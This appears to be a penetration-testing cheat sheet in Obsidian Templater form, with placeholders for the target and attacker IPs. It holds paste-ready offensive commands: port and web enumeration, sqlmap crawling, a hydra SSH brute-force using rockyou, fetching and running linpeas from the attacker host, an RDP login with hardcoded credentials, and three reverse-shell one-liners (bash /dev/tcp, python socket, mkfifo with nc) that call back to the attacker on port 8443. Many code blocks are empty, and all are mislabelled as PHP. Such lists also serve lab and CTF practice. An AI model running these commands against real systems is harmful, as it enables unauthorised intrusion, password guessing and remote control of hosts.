```php
nmap -A -p- <% tp.frontmatter.target_ip %>
```

```php
nmap -sC -sV -p- <% tp.frontmatter.target_ip %>
```

```php
nmap -sV -script=safe -p80 <% tp.frontmatter.target_ip %>
```
- Scripts need the `-sV` argument

```php
grep -r /usr/share/nmap/scripts/*.nse | grep -oP '".*?"' | sort -u
```

```php
dig <% tp.frontmatter.target_ip %> -t mx
```

```php
proxychains nmap -sT --top-ports=100 -Pn <% tp.frontmatter.target_ip %>
```

```php
gobuster dir -w /usr/share/seclists/SecLists-master/Discovery/ -u <% tp.frontmatter.target_ip %>
```

```php
gobuster vhost --append-domain --wordlist /usr/share/seclists/SecLists-master/Discovery/DNS/subdomains-top1million-20000.txt -u <% tp.frontmatter.target_ip %>
```

```php
wpscan --url http://<%tp.frontmatter.target_ip %>/webservices/wp/index.php --proxy 127.0.0.1:8080 --enumerate ap tt at
```

```php
sqlmap -u https://<%tp.frontmatter.target_ip %>/ –crawl=1
```

```php
hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://<%tp.frontmatter.target_ip %>
```

```php
wget <%tp.frontmatter.my_ip %>/linpeas.sh
```

```php
enum4linux -h <%tp.frontmatter.my_ip %>
```

```php
curl http://<%tp.frontmatter.my_ip %>/linpeas.sh > linpeas.sh
chmod +x linpeas.sh
./linpeas.sh | tee linpeas.txt
```

```php
xfreerdp /u:yoshi /p:"Mushroom!" /v:<%tp.frontmatter.my_ip %>
```

```php

```

```php
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
- background `ctrl+z`
```php
stty -a 
```

```php
echo $TERM
```

```php
stty raw -echo 
```
- foreground `fg`
```php
stty rows <x> columns <y>
```

```php
export TERM=xterm
```

```php
bash -c "bash -i >& /dev/tcp/<%tp.frontmatter.my_ip %>/8443 0>&1"
```

```php
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<%tp.frontmatter.my_ip %>",8443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

```php
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <%tp.frontmatter.my_ip %> 8443 >/tmp/f
```

```php

```

```php

```

```php

```

```php

```

```php

```

```php

```

```php

```

```php

```

```php

```

```php

```

```php

```

```php

```

```php

```

```php

```

```php

```

```php

```

